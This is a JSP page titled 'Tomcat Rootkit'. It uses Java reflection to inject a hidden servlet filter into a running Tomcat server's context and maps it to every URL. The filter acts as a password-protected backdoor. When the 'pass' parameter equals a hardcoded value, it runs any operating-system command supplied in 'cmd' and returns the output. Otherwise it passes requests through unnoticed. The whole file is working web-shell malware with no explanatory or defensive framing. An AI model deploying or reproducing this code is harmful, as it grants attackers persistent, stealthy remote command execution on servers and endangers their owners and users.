<%@ page language="java" contentType="text/html; charset=UTF-8"
    pageEncoding="UTF-8"%>
<!DOCTYPE html PUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN" "http://www.w3.org/TR/html4/loose.dtd">
<html>
<head>
<meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
<title>Tomcat Rootkit</title>
</head>
<%
	ServletContext applicationContextFacade = request.getServletContext();
	java.lang.reflect.Field f1 = applicationContextFacade.getClass().getDeclaredField("context");
	f1.setAccessible(true);
	Object applicationContext = f1.get(applicationContextFacade);
	java.lang.reflect.Field f2 = applicationContext.getClass().getDeclaredField("context");
	f2.setAccessible(true);
	org.apache.catalina.core.StandardContext servletContext = (org.apache.catalina.core.StandardContext)f2.get(applicationContext);
	
	java.lang.reflect.Field f3 = servletContext.getClass().getDeclaredField("filterConfigs");
	f3.setAccessible(true);
	java.util.HashMap<String, org.apache.catalina.core.ApplicationFilterConfig> filterConfigs = (java.util.HashMap<String, org.apache.catalina.core.ApplicationFilterConfig>)f3.get(servletContext);

	String rootkitName = "tomcatrootkit";
	if(filterConfigs.containsKey(rootkitName)){
		filterConfigs.remove(rootkitName);
		out.print("remove old tomcat rootkit ...<br/>");
	}
	for(String key : filterConfigs.keySet()){
		org.apache.catalina.core.ApplicationFilterConfig v = filterConfigs.get(key);
		out.print(v + "<br/>");
	}
	
	javax.servlet.Filter tomcatRootkitFilter = new javax.servlet.Filter(){

		@Override
		public void destroy() {
			// TODO Auto-generated method stub
		
		}

		@Override
		public void doFilter(ServletRequest req, ServletResponse res, FilterChain chain)
			throws java.io.IOException, ServletException {
			// TODO Auto-generated method stub
			//System.out.println("tomcatrootkit");
			String pass = req.getParameter("pass");
			if(pass != null && "lupin".equals(pass)){
				String cmd = req.getParameter("cmd") == null ? "whoami" : req.getParameter("cmd");
				StringBuffer sb = new StringBuffer();
				try{
					java.io.BufferedReader br = new java.io.BufferedReader(new java.io.InputStreamReader(Runtime.getRuntime().exec(cmd).getInputStream(),"GBK"));
					String line = null;
					while((line = br.readLine()) != null){
						sb.append(line + "<br/>");
					}
					res.setContentType("text/html;charset=GBK");
					res.getWriter().print(sb.toString());
				}catch(Exception e){}
			}else{
				chain.doFilter(req, res);
			}
			
		}

		@Override
		public void init(FilterConfig arg0) throws ServletException {
			// TODO Auto-generated method stub
		
		}
	
	};
	org.apache.catalina.deploy.FilterDef fd = new org.apache.catalina.deploy.FilterDef();
	fd.setFilterName(rootkitName);
	fd.setFilterClass(tomcatRootkitFilter.getClass().getName());
	fd.setFilter(tomcatRootkitFilter);
	out.print(fd.toString() + "<br/>");
	

	org.apache.catalina.deploy.FilterMap filterMap = new org.apache.catalina.deploy.FilterMap();
	filterMap.setFilterName(rootkitName);
	filterMap.addURLPattern("/*");
	out.print(filterMap.toString() + "<br/>");

	servletContext.addFilterDef(fd);
	servletContext.addFilterMap(filterMap);
	java.lang.reflect.Constructor c = org.apache.catalina.core.ApplicationFilterConfig.class.getDeclaredConstructor(org.apache.catalina.Context.class,org.apache.catalina.deploy.FilterDef.class);
	c.setAccessible(true);
	
	filterConfigs.put(rootkitName, (org.apache.catalina.core.ApplicationFilterConfig)c.newInstance(servletContext,fd));
	out.print("success!!<br/>");
%>
<body>
</body>
</html>